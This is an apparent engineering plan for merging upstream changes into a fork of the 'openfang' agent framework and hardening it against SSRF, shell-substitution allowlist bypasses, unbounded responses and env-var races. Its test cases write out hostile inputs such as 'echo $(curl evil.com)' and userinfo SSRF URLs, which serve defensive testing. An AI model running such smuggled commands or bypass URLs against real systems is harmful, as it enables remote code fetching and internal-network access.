# Upstream Merge + Security Fixes Plan

**Date:** 2026-03-08
**Status:** Approved
**Approach:** Option A — Merge upstream first, then fix security issues

## Overview

Two workstreams:
1. **Merge** 28 upstream commits from `RightNow-AI/openfang` into our fork
2. **Fix** 5 security/code issues (all still unfixed upstream)

## Phase 1: Upstream Merge

### Branch Strategy
- Create branch `merge/upstream-2026-03-08` from `main`
- Merge `upstream/main` into it
- Resolve 13 conflict files
- Verify build/test/clippy pass
- PR to `main`

### Conflict Files (13)

| File | Likely Cause | Resolution Strategy |
|------|-------------|---------------------|
| `Cargo.lock` | Version bumps both sides | Accept upstream, re-run `cargo update` |
| `crates/openfang-api/Cargo.toml` | Dependency additions both sides | Manual merge, keep both additions |
| `crates/openfang-api/src/middleware.rs` | Both added middleware | Keep both, order doesn't matter |
| `crates/openfang-api/src/routes.rs` | Heavy changes both sides (goals, budget, settings) | Manual merge — largest conflict, needs care |
| `crates/openfang-api/static/js/pages/wizard.js` | UI changes both sides | Manual merge |
| `crates/openfang-channels/src/discord.rs` | Channel resilience upstream | Accept upstream, verify our changes preserved |
| `crates/openfang-channels/src/telegram.rs` | Major upstream rewrite (186 lines) | Accept upstream, re-apply our minor fixes |
| `crates/openfang-kernel/src/kernel.rs` | Both added features (goals vs agent identity) | Manual merge, keep both |
| `crates/openfang-runtime/src/drivers/copilot.rs` | Upstream resilience changes | Accept upstream, verify our timeout changes |
| `crates/openfang-runtime/src/drivers/mod.rs` | Both modified driver list | Manual merge |
| `crates/openfang-runtime/src/drivers/openai.rs` | Upstream added 50+ lines resilience | Accept upstream, re-apply our keepalive |
| `crates/openfang-runtime/src/embedding.rs` | Upstream refactored embeddings | Accept upstream |
| `crates/openfang-runtime/src/model_catalog.rs` | Major upstream expansion (80+ lines) | Accept upstream |

### Verification Gate
```bash
cargo build --workspace --lib
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
```

All three must pass before moving to Phase 2.

---

## Phase 2: Security Fixes

Branch `fix/security-hardening` from merged `main`.

### Fix 1 (P0): SSRF Protection — Fail-Closed + Userinfo Stripping

**Files:** `web_fetch.rs`, `host_functions.rs`

**Problems:**
- DNS resolution failure silently allows the request (fail-open)
- URL userinfo (`http://user:pass@host/`) not stripped before hostname extraction
- `host_functions.rs` has weaker blocklist than `web_fetch.rs`

**Fix:**
1. Use `url::Url` crate for proper URL parsing (already a transitive dep via reqwest)
2. Change DNS check from `if let Ok(addrs)` to fail-closed: if DNS fails, block the request
3. Unify SSRF logic into a single shared function in a new `crates/openfang-runtime/src/ssrf.rs`
4. Both `web_fetch.rs` and `host_functions.rs` call the unified function
5. Full blocklist: localhost, ip6-localhost, metadata endpoints, 0.0.0.0, ::1, cloud IMDS

**Tests to add:**
- `test_ssrf_blocks_userinfo_bypass` — `http://anything@localhost/`
- `test_ssrf_fails_closed_on_dns_failure` — `http://nonexistent.invalid/`
- `test_ssrf_blocks_all_cloud_metadata` — all IMDS endpoints

### Fix 2 (P0): Exec Allowlist — Block Shell Metacharacters

**Files:** `subprocess_sandbox.rs`

**Problem:** `extract_all_commands()` only splits on `&&`, `||`, `|`, `;` but `sh -c` interprets `$()`, backticks, `<()` which embed invisible commands.

**Fix:**
1. In `validate_command_allowlist()` when mode is `Allowlist`, reject commands containing:
   - `$(` — command substitution
   - `` ` `` — backtick substitution
   - `<(` or `>(` — process substitution
2. Clear error message: `"Shell substitution ($(), backticks) not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed."`
3. Check runs BEFORE `extract_all_commands()` to catch the bypass early

**Tests to add:**
- `test_allowlist_blocks_command_substitution` — `echo $(curl evil.com)`
- `test_allowlist_blocks_backticks` — `` echo `curl evil.com` ``
- `test_allowlist_blocks_process_substitution` — `cat <(curl evil.com)`
- `test_full_mode_allows_substitution` — confirm `full` mode is unaffected

### Fix 3 (P1): Response Size Limit — Streaming Guard

**Files:** `web_fetch.rs`, `tool_runner.rs`

**Problem:** `content_length()` check is skipped for chunked/streaming responses. `.text().await` buffers entire body into memory.

**Fix:**
1. After the `content_length()` check, use `resp.bytes().await` and check `.len()` before converting to string
2. OR: read body in chunks with a byte counter, abort when limit exceeded
3. Apply to both `WebFetchEngine::fetch_with_options()` and `tool_web_fetch_legacy()` in `tool_runner.rs`

**Approach:** Use `resp.bytes().await` with reqwest's built-in body limit. Set `reqwest::Client::builder().max_response_size()` if available, otherwise check `bytes.len()` post-download and reject.

**Tests:** Unit test with mock server serving chunked response > limit.

### Fix 4 (P2): ENV_MUTEX Consistency

**Files:** `routes.rs`

**Problem:** 4 call sites use `set_var`/`remove_var` without the `ENV_MUTEX` guard.

**Fix:** Wrap all 4 unguarded calls:
- Line ~3687 (PATH refresh)
- Line ~6411 (API key set)
- Line ~6467 (API key remove)
- Line ~9642 (GitHub token set)

Pattern:
```rust
{
    let _guard = ENV_MUTEX.lock().unwrap();
    unsafe { std::env::set_var(&env_var, &value); }
}
```

**Tests:** Existing tests sufficient — this is a correctness fix.

### Fix 5 (P3): Delivery Receipt Eviction Loop

**Files:** `kernel.rs`

**Problem:** Single-bucket eviction may not drain enough entries to get below `MAX_RECEIPTS`.

**Fix:** Replace single-pass eviction with a loop:
```rust
let mut remaining = total.saturating_sub(Self::MAX_RECEIPTS);
while remaining > 0 {
    if let Some(mut entry) = self.receipts.iter_mut().next() {
        let drain = remaining.min(entry.value().len());
        if drain == 0 { break; } // all buckets empty
        entry.value_mut().drain(..drain);
        remaining -= drain;
    } else {
        break;
    }
}
```

**Tests to add:**
- `test_receipt_eviction_respects_global_cap` — insert across many agents, verify total <= MAX_RECEIPTS

---

## Phase 3: Verification & Review

### Build Verification
```bash
cargo build --workspace --lib
cargo test --workspace
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --all -- --check
```

### Live Integration Test
```bash
pkill -f openfang || true
sleep 3
cargo build --release -p openfang-cli
GROQ_API_KEY=<key> target/release/openfang start &
sleep 6
curl -s http://127.0.0.1:4200/api/health
curl -s http://127.0.0.1:4200/api/agents
pkill -f openfang || true
```

### Code Review Checklist
- [ ] SSRF: `http://user@localhost/` is blocked
- [ ] SSRF: DNS failure returns error (not silent pass)
- [ ] SSRF: Both code paths use unified function
- [ ] Exec: `echo $(curl evil)` rejected in allowlist mode
- [ ] Exec: `echo hello` still works in allowlist mode
- [ ] Response: Chunked response > limit is rejected
- [ ] ENV: All `set_var`/`remove_var` use ENV_MUTEX
- [ ] Receipts: Global cap strictly enforced

---

## Agent Assignments

### Phase 1: Upstream Merge
| Step | Agent | Task |
|------|-------|------|
| 1.1 | **Dev Agent** | Create branch, run merge, resolve 13 conflicts |
| 1.2 | **Dev Agent** | Fix build errors, run cargo build/test/clippy |
| 1.3 | **Critique Agent** | Review conflict resolutions — no dropped code? |
| 1.4 | **Test Agent** | Full test suite + manual spot-check of upstream features |

### Phase 2: Security Fixes (parallel where possible)
| Step | Agent | Task |
|------|-------|------|
| 2.1 | **Dev Agent A** | Fix 1 (SSRF) + Fix 2 (Exec allowlist) — both in runtime crate |
| 2.2 | **Dev Agent B** | Fix 3 (Response size) + Fix 4 (ENV_MUTEX) + Fix 5 (Receipts) |
| 2.3 | **Critique Agent** | Security review of all 5 fixes |
| 2.4 | **Test Agent** | Run new + existing tests, verify no regressions |

### Phase 3: Ship
| Step | Agent | Task |
|------|-------|------|
| 3.1 | **Test Agent** | Full verification gate (build + test + clippy + fmt) |
| 3.2 | **Critique Agent** | Final review against checklist |
| 3.3 | **Prod Agent** | PR creation, live integration test, merge |

---

## Risk Mitigation

| Risk | Mitigation |
|------|-----------|
| Merge conflicts break subtle logic | Critique agent reviews every conflict resolution |
| Security fix introduces regression | Full test suite + new targeted tests |
| `url::Url` parsing differs from reqwest | Both use the same `url` crate internally |
| Metacharacter rejection too aggressive | Only block `$(`, backtick, `<(`, `>(` — not `$VAR` or `*` |
| ENV_MUTEX deadlock | Mutex is non-reentrant, all guards are scoped `{}` blocks |
